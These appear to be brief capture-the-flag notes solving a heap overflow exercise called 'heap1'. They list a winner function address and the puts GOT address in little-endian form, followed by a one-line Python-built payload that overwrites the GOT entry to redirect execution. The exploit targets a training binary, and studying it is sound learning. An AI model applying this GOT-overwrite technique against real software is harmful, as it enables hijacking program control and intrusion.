winner: 0x0804849a
needed: 9a 84 04 08


puts address: 0x08049774
needed: 74 97 04 08

./heap1 $(python -c "print('A'*20 + '\x74\x97\x04\x08')") $(python -c "print('\x9a\x84\x04\x08')")

